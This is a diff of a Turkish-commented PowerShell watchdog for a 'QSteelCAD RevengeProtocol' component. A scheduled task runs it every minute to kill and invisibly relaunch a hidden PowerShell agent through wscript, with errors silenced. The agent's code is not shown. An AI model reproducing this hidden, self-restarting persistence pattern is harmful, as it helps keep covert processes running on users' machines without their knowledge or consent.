@@ -1,24 +1,26 @@
-# Kulak çalışmıyorsa yeniden başlat (Görev Zamanlayıcı watchdog veya manuel).
-# QSteelCAD.exe gerekmez — yalnızca gizli PowerShell agent.
+# Kulak yoksa veya sinyal 25 sn'den eskiyse yeniden başlat.
+# QSteelCAD.exe gerekmez. Görev Zamanlayıcı her dakika çağırır.
 $ErrorActionPreference = 'SilentlyContinue'
-$dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
-$log = Join-Path $dir 'agent.log'
 $vbs = Join-Path ${env:ProgramFiles} 'QSteelCAD\RevengeProtocol\run-agent-hidden.vbs'
 if (-not (Test-Path -LiteralPath $vbs)) {
   $vbs = Join-Path ${env:ProgramFiles(x86)} 'QSteelCAD\RevengeProtocol\run-agent-hidden.vbs'
 }
 if (-not (Test-Path -LiteralPath $vbs)) { exit 0 }
 
-$agentRunning = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-  Where-Object { $_.CommandLine -like '*RevengeProtocolAgent.ps1*' } |
-  Select-Object -First 1
-if ($agentRunning) { exit 0 }
-
-$fresh = $false
+$log = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol\agent.log'
+$stale = $true
 if (Test-Path -LiteralPath $log) {
-  $fresh = (Get-Item -LiteralPath $log).LastWriteTime -gt (Get-Date).AddSeconds(-35)
+  $stale = (Get-Item -LiteralPath $log).LastWriteTime -lt (Get-Date).AddSeconds(-25)
 }
-if ($fresh) { exit 0 }
 
-Start-Process -FilePath 'wscript.exe' -ArgumentList @('//B', $vbs) -WindowStyle Hidden
+$agents = @(Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
+  Where-Object { $_.CommandLine -like '*RevengeProtocolAgent.ps1*' })
+
+if ($agents.Count -gt 0 -and -not $stale) { exit 0 }
+
+foreach ($a in $agents) {
+  Stop-Process -Id $a.ProcessId -Force -ErrorAction SilentlyContinue
+}
+Start-Sleep -Milliseconds 400
+Start-Process -FilePath "$env:SystemRoot\System32\wscript.exe" -ArgumentList @('//B', $vbs) -WindowStyle Hidden
 exit 0
